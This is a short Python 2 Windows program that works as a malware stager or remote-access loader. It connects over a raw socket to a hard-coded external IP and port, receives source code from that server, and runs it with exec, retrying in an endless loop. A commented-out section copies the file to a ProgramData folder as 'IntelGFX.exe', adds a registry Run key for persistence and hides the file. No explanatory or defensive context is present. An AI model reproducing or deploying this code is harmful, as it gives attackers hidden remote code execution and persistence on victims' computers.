
# -*- coding: utf-8 -*-
# !/usr/bin/python

import socket
import time
import ast
import sys
import os
import platform
from ctypes.wintypes import MSG
from ctypes import wintypes, windll
import ctypes
import threading
import subprocess
import sched
import datetime
import zlib
import shutil

HOST = '109.172.189.74'
#HOST = '127.0.0.1'
PORT = 4434
ACTIVE = False

CSIDL_COMMON_APPDATA = 35

_SHGetFolderPath = windll.shell32.SHGetFolderPathW
_SHGetFolderPath.argtypes = [wintypes.HWND,
                            ctypes.c_int,
                            wintypes.HANDLE,
                            wintypes.DWORD, wintypes.LPCWSTR]


path_buf = wintypes.create_unicode_buffer(wintypes.MAX_PATH)
result = _SHGetFolderPath(0, CSIDL_COMMON_APPDATA, 0, 0, path_buf)

destination_folder = os.path.join(path_buf.value, 'Intel')
if not os.path.exists(destination_folder):
    os.makedirs(destination_folder)
destination_path = os.path.join(os.path.join(destination_folder, 'IntelGFX.exe'))
file_name = sys.argv[0]


# if not 'IntelGFX' in sys.argv[0]:
#     if not os.path.exists(destination_path):
#         shutil.copy2(sys.argv[0], destination_path)
#
#     if Shell32.IsUserAnAdmin() == 1:
#         reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format(
#             'Intel', destination_path)
#     else:
#         reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format(
#             'Intel', destination_path)
#     subprocess.Popen(reg_payload)
#
#     attrib_payload = r'attrib +h +s %s' % destination_path
#     subprocess.Popen(attrib_payload)
#     sys.exit(0)

while 1:
    try:
        GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        GLOBAL_SOCKET.connect((HOST, PORT))
        GLOBAL_SOCKET.recv(1024)
        GLOBAL_SOCKET.sendall(str({'mode': 'buildClient', 'from': 'client', 'payload': '', 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
        received_data = ''
        payload = GLOBAL_SOCKET.recv(1024)
        while payload:
            received_data = received_data + payload
            if received_data.endswith('[ENDOFSOURCE]'):
                received_data = received_data[:-len('[ENDOFSOURCE]')]
                break
            else:
                payload = GLOBAL_SOCKET.recv(1024)
                continue
        try:
            ACTIVE = True

            # TODO: SOURCE
            exec received_data
            # TODO: END SOURCE

        except Exception as e:
            ACTIVE = False
            GLOBAL_SOCKET.sendall(str({'mode': 'buildClientError', 'from': 'client', 'payload': '%s' % e, 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
            GLOBAL_SOCKET.close()
            del GLOBAL_SOCKET
            time.sleep(6)
    except socket.error as e:
        time.sleep(5)